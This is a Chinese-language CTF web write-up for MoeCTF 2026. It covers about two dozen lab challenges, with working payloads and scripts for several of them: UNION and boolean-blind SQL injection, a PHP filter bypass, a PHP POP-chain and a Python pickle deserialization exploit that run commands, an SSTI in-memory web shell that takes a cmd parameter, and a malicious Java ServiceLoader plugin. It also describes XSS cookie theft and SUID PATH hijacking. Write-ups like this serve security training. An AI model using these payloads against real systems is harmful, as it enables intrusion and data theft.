# MoeCTF 2026 Web WriteUp

### 当零来敲门

详情见`README.md`

### 查分系统

查看源代码即可

### 查分系统_revenge

审计源代码发现全部为加密信息，同时发现加密代码，对key未知，这时候就需要爆破key，根据题目提示，key应该为学号，参考”查分系统“题目源代码，可以有一个相对小的爆破范围，进行爆破解密即可

### 归途

key1在F12的控制台不断打印输出

key2在源代码中，同时可以看到`/getKey`这一api，访问即可获取key3

key4根据提示，将GET请求id参数改为4即可获取，同时收获两个提示`"Do you know HTTP headers? Check it. Besides, Try to POST this api"`。这两个提示分别指向key5和key6，这时查看响应头即可获取key5；对该api发送任意POST请求即可得到key6

最终提示需要login，这里访问/login，根据页面提示先用guest账密登录，随后查看Cookie，修改字段内容即可获得key7，并拿到提示“爬虫重要文件”

访问robots.txt看到指向了/f13ggggg，访问后将7个key分别base64解码拼在一起提交即可拿到flag

### MoeCatchTheFrogs

考察flask_session，对key未知，需要爆破（可以使用flask-unsign工具），得到key值后伪造新的session即可拿到flag

### 古籍翻阅

同样考察爆破，同时考察了目录穿梭。题目给出了“古籍目录”，爆破后发现仅有一个目录为200，访问后可以得到hint，flag藏在根目录下，重新改变GET提交的值为`../../../../../../flag`即可拿到flag

### 河湖小盗

考察SQL注入的联合查询，依次使用以下命令即可获取库名、表明、列名，最终拿到flag

```
-1 union select 1,database(),3
-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'past_paper'
-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'flag_table' and table_schema = 'past_paper'
-1 union select 1,group_concat(flag),3 from flag_table
```

### 江洋大盗

考察SQL注入的布尔盲注，参考脚本如下：

```python
import html
import sys
import urllib.parse
import urllib.request


SIGNAL = "高等数学"


def post_query(target, payload):
    data = urllib.parse.urlencode({"id": payload}).encode()
    req = urllib.request.Request(target, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=8) as resp:
        return html.unescape(resp.read().decode("utf-8", errors="replace"))


def oracle(target, expression):
    payload = f"1 AND ({expression})"
    page = post_query(target, payload)
    return SIGNAL in page


def extract_length(target, expression, upper=256):
    lo, hi = 0, upper
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(target, f"CHAR_LENGTH(({expression}))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo


def extract_char(target, expression, position):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        condition = f"ASCII(SUBSTR(({expression}),{position},1))>={mid}"
        if oracle(target, condition):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


def extract_string(target, label, expression, upper=256):
    length = extract_length(target, expression, upper=upper)
    value = ""
    for position in range(1, length + 1):
        value += extract_char(target, expression, position)
        print(f"{label}: {value}", flush=True)
    return value


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/"
    expressions = [
        ("database", "database()", 64),
        (
            "tables",
            "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
            "FROM information_schema.tables WHERE table_schema=database()",
            160,
        ),
        (
            "columns",
            "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
            "FROM information_schema.columns "
            "WHERE table_schema=database() AND table_name='flag_table'",
            128,
        ),
        ("flag", "SELECT GROUP_CONCAT(flag SEPARATOR ',') FROM flag_table", 200),
    ]

    results = {}
    for label, expression, upper in expressions:
        results[label] = extract_string(target, label, expression, upper=upper)
        print(f"[+] {label}: {results[label]}", flush=True)

    print(results["flag"])


if __name__ == "__main__":
    main()          
```

### 熊出没

考察gopher协议，在输入栏输入错误格式会报错，报错信息中有提示gopher协议，然后输入`gopher://127.0.0.1:54321`会看到提示/secret-honey，最后输入`gopher://127.0.0.1:54321//secret-honey`即可拿到flag，这里需注意第二个反斜杠代表根目录，与常规的http协议并不相同，可以自行了解

### 七狗免费小说

考察php文件包含漏洞，审计flag章的源代码可以发现被编码后的黑名单，具体如下：

```php
preg_match(
    '/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i',
    $file
)
```

这里只需要换一种读取时采用的编码即可绕过，例：

```
php://filter/read=zlib.deflate/resource=flag.php
```

### 七狗收费小说

考察git泄露和php反序列化，先获取/.git泄露的源码，然后写POP链即可，参考构造如下：

```php
<?php
class User {
    public $username, $password;
    public $secret_a, $secret_b;
}

class UserInfo {
    public $user, $permission;
}

class Diagnosis {
    public $key, $value, $action;
}

$cmd = $argv[1] ?? 'cat /flag';

$runner = new Diagnosis();
$runner->key = '';
$runner->value = null;
$runner->action = null;

$getter = new Diagnosis();
$getter->key = 'username';
$getter->value = $cmd;
$getter->action = $runner;

$info = new UserInfo();
$info->user = $getter;
$info->permission = '7';

$user = new User();
$user->username = $info;
$user->password = $info;
$user->secret_a = 0;
$user->secret_b =& $user->secret_a;

echo base64_encode(serialize($user)), PHP_EOL;

```

### 合乎周礼

考察js原型链污染，抓包改包修改\_\_proto\_\_即可绕过，拿到flag

### 礼崩乐坏

同样是js原型链污染，但是ban了\_\_proto\_\_，可以通过constructer.prototype进行绕过

### 我爱发明

考察爬虫，以下是参考代码：

```python
import hashlib
import json
import re
import sys
from http.cookiejar import CookieJar
from urllib import request
from urllib.error import HTTPError
from urllib.parse import urljoin


def fetch(opener, url):
    with opener.open(url, timeout=8) as response:
        return response.read().decode("utf-8")


def post_json(opener, url, payload):
    data = json.dumps(payload).encode("utf-8")
    req = request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with opener.open(req, timeout=8) as response:
            return json.loads(response.read().decode("utf-8"))
    except HTTPError as exc:
        body = exc.read().decode("utf-8")
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            raise RuntimeError(body) from exc


def extract_page_count(html):
    match = re.search(r"第\s+\d+\s*/\s*(\d+)\s+页", html)
    if not match:
        raise RuntimeError("cannot find archive page count")
    return int(match.group(1))


def extract_machine_links(html, base_url):
    links = []
    pattern = re.compile(r'<a class="invent-link" href="([^"]+)"[^>]*data-team="机械组"')
    for href in pattern.findall(html):
        links.append(urljoin(base_url, href))
    return links


def extract_code_if_accepted(html):
    if 'data-team="机械组"' not in html or 'data-status="通过"' not in html:
        return None
    match = re.search(r'class="inspection-code" data-code="([^"]+)"', html)
    return match.group(1) if match else None


def solve(base_url):
    base_url = base_url.rstrip("/") + "/"
    jar = CookieJar()
    opener = request.build_opener(request.HTTPCookieProcessor(jar))

    fetch(opener, urljoin(base_url, "stage/3"))
    first_archive = fetch(opener, urljoin(base_url, "archive?page=1"))
    page_count = extract_page_count(first_archive)

    codes = []
    for page in range(1, page_count + 1):
        if page == 1:
            archive_html = first_archive
        else:
            archive_html = fetch(opener, urljoin(base_url, f"archive?page={page}"))
        for detail_url in extract_machine_links(archive_html, base_url):
            detail_html = fetch(opener, detail_url)
            code = extract_code_if_accepted(detail_html)
            if code:
                codes.append(code)

    answer = hashlib.sha256("|".join(codes).encode("utf-8")).hexdigest()
    result = post_json(opener, urljoin(base_url, "api/finalize"), {"answer": answer})
    if not result.get("ok"):
        raise RuntimeError(result)
    return codes, answer, result["flag"]


def main():
    if len(sys.argv) != 2:
        print("usage: python solve.py http://host:port", file=sys.stderr)
        raise SystemExit(2)
    codes, answer, flag = solve(sys.argv[1])
    print(f"collected {len(codes)} codes")
    print(f"answer {answer}")
    print(f"flag {flag}")


if __name__ == "__main__":
    main()
                
```

### 日志系统

考察python pickle反序列化，利用反序列化时会执行\_\_reduce\_\_函数即可构造恶意序列化字符串，上传后即可获取flag，参考构造代码如下：

```python
# exploit.py
import pickle
import subprocess
import requests
import sys
from urllib.parse import urlparse, parse_qs

target = sys.argv[1].rstrip("/")

class RCE:
    def __reduce__(self):
        return (subprocess.getoutput, ("cat /flag",))

payload = pickle.dumps(RCE())

r = requests.post(
    target + "/import",
    files={"file": ("logs.pkl", payload, "application/octet-stream")},
    allow_redirects=False,
)

loc = r.headers.get("Location", "")
print("redirect:", loc)

msg = parse_qs(urlparse(loc).query).get("msg", [""])[0]
print(msg)
```

### bblogin

考察SSTI和session伪造。通过{{config}}即可拿到secret_key，伪造管理员session登录后台即可拿到flag

### 我刚一提交就发现了三个问题

考察文件提交漏洞的时间竞争，需要同时发两个包，一个包不断上传恶意文件，另一个不断轮询上传后的恶意文件，即可避免被系统定时任务删除，拿到flag

### 旧能源管理系统

无回显SSTI，题目无法出网，这里给出参考示例（此处为内存马，也可以建static，可自行了解）

```python
{{url_for.__globals__[
'__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
```

然后GET方法传入cmd参数即可

### 黑市走私

考察http smuggling以及jwt，根据提示伪造好jwt后，放在请求包的Authorization：Bearer字段，而不是Cookie字段，并进行CLTE和TETE走私。CLTE阶段注意关闭发包工具的自动长度修正。

### 巧乐兹

考察Fastjson反序列化，关键点在于可以通过修改序列化字符串中`@type`的类型来人为操控反序列化后得到对象的属性，同时配置中给了白名单`com.example.demo.`，其子类`MetricDTO`存在危险方法。我们只需要构造恶意序列化字符串即可读取flag

### 千度网盘

先做一个用于”目录穿梭“的压缩文件，即自身内部包含文件结构的压缩文件，用于绕过普通文件调用时的防护，然后上传压缩包，最终写入plugins，因为`PluginService` 初始化时会创建一个类加载器：

```java
private static final Path BASE =
    Path.of("./plugins").toAbsolutePath().normalize();

private final URLClassLoader classLoader;

public PluginService() throws IOException {
    classLoader = new URLClassLoader(
        new URL[]{BASE.toUri().toURL()},
        getClass().getClassLoader()
    );
}
```

这里的 `URLClassLoader` 把：`./plugins`作为类路径根目录。

同时，有以下代码：

```java
ServiceLoader<Runnable> loader =
    ServiceLoader.load(Runnable.class, classLoader);

for (Runnable plugin : loader) {
    plugin.run();
}
```

会自动寻找Runnable插件并自动调用其run()方法，同时Java 的 `ServiceLoader` 需要一个服务描述文件：

```
META-INF/services/java.lang.Runnable
```

文件内容写入插件类名：

```
exploit.Pwn
```

所以最终插件目录结构必须是

```
plugins/
├── exploit/
│   └── Pwn.class
└── META-INF/
    └── services/
        └── java.lang.Runnable
```

`ServiceLoader` 读取服务文件后，会执行以下过程：

```java
读取 META-INF/services/java.lang.Runnable
        ↓
发现 exploit.Pwn
        ↓
用 URLClassLoader 加载 exploit.Pwn
        ↓
实例化 Pwn
        ↓
调用 Pwn.run()
```

插件类只需要满足：

```java
public class Pwn implements Runnable {
    @Override
    public void run() {
        // 任意 Java 代码，可以写一个将flag复制到网盘然后下载的逻辑
    }
}
```

参考代码如下：

```java
package exploit;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

public final class Pwn implements Runnable {
    @Override
    public void run() {
        try {
            Files.createDirectories(Path.of("files"));
            String flag = Files.readString(
                Path.of("/flag"),
                StandardCharsets.UTF_8
            );
            Files.writeString(
                Path.of("files/plugin-output.txt"),
                flag,
                StandardCharsets.UTF_8
            );
        } catch (IOException e) {
            throw new RuntimeException("File operation failed", e);
        }
    }
}

```

最后会有plugin-output.txt文件，下载即可获取flag

### Moe论坛

考察XSS、文件上传、suid提权与路径劫持，首先写一个XSS来获取管理员权限，本题不能出网，可以将获取到的Cookie放到帖子中，获取管理员权限后发现文件上传ban掉了php后缀，这里可以采用phtml进行绕过，getshell后发现权限不足，搜寻suid程序发现异常suid程序`hostname`，其本用于设置主机名，通过-F参数读取文件内容，理论上不应在suid列表中。但是本题对可执行程序进行了魔改，通过which命令可以发现hostname被重新编译过，源文件与可执行文件存储于同一目录，内容逻辑如下：

```C
#include  
#include  
int main(int argc, char *argv[]) {
	char *new_argv[argc + 1];     
	new_argv[0] = "rev";
	for (int i = 1; i < argc; i++) new_argv[i] = argv[i];
	new_argv[argc] = NULL;
	execvp("rev", new_argv);   
	return 1; 
}
```

可以看到最终调用了rev，所以我们要自己写一个rev替代原有的rev用于读取flag，并劫持环境变量中的PATH变量，让其指向我们自己编译的rev可执行程序。最终即可拿到flag